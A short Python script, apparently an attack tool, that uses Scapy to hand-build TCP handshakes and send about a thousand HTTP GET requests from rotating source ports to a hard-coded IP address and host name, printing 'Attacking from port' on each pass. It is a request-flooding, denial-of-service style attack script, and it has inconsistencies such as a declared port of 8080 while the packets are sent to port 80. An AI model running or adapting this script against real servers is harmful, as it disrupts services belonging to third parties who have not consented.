from scapy.all import *
from random import randint

x = "instance2mymachines.xyz"
y = "www.instance2mymachines.xyz:8080"
ip = "35.193.17.254"
dport = 8080
sp = 3000
numgets = 1000

i = IP()
i.dst = ip
print("IP layer prepared: ", i.summary())

for s in range(sp, sp + numgets - 1):
    t = TCP()
    t.dport = 80
    t.sport = s
    t.flags = "S"
    ans = sr1(i / t, verbose=0)
    t.seq = ans.ack
    t.ack = ans.seq + 1
    t.flags = "A"
    get = "GET / HTTP/1.1\r\nHost: " + y
    ans = sr1(i / t / get, verbose=0)
    print("Attacking from port ", s)
print("Done!")
